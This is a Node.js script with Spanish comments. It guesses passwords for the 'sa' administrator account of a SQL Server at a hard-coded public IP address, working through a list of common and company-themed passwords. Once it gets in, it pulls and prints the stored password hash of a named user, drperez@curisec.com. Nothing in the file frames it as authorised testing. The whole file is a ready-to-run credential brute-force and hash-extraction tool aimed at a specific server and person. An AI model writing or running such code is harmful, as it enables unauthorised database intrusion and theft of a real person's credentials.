import mssql from 'mssql';

// Intentar múltiples contraseñas comunes para 'sa'
const passwords = [
  'Curisec123!',
  'Curisec@123',
  'curisec123',
  'curisec123!',
  'Password123!',
  'password123',
  'sa',
  '',
  'Passw0rd',
  'Curisec2024!',
  'Admin123!',
  'MSSQLServer',
];

console.log('═══════════════════════════════════════════════════════════');
console.log('🔐 INTENTANDO MÚLTIPLES CONTRASEÑAS PARA USUARIO SA');
console.log('═══════════════════════════════════════════════════════════\n');

const baseConfig = {
  server: '190.92.153.67',
  port: 1433,
  database: 'curisec',
  authentication: {
    type: 'default',
    options: {
      userName: 'sa',
      password: '' // Se reemplaza en cada intento
    }
  },
  options: {
    trustServerCertificate: true,
    encrypt: true,
    connectTimeout: 5000
  }
};

async function tryPassword(password) {
  return new Promise((resolve) => {
    const config = JSON.parse(JSON.stringify(baseConfig));
    config.authentication.options.password = password;
    
    const pool = new mssql.ConnectionPool(config);
    
    pool.connect()
      .then(async () => {
        console.log(`✅ ÉXITO: Contraseña correcta = "${password}"\n`);
        
        try {
          const request = pool.request();
          const result = await request.query(`
            SELECT 
              Id,
              Email,
              Password,
              Status,
              CreatedDate
            FROM dbo.Users 
            WHERE Email = 'drperez@curisec.com'
          `);
          
          if (result.recordset.length > 0) {
            const row = result.recordset[0];
            console.log('📋 DATOS DEL USUARIO:\n');
            console.log(`  Id: ${row.Id}`);
            console.log(`  Email: ${row.Email}`);
            console.log(`  Password Hash: ${row.Password}`);
            console.log(`  Status: ${row.Status}`);
            console.log(`  CreatedDate: ${row.CreatedDate}\n`);
            console.log('═══════════════════════════════════════════════════════════');
            console.log('🎯 HASH ENCONTRADO:');
            console.log(`   ${row.Password}`);
          } else {
            console.log('⚠️  Usuario drperez@curisec.com NO existe en la BD');
          }
        } catch (err) {
          console.error('Error en query:', err.message);
        }
        
        pool.close();
        resolve(true);
      })
      .catch(() => {
        process.stdout.write(`❌ "${password}" - No válida\n`);
        pool.close();
        resolve(false);
      });
  });
}

async function main() {
  for (const pwd of passwords) {
    const success = await tryPassword(pwd);
    if (success) break;
  }
  
  console.log('\n✅ Proceso completado');
  process.exit(0);
}

main().catch(console.error);
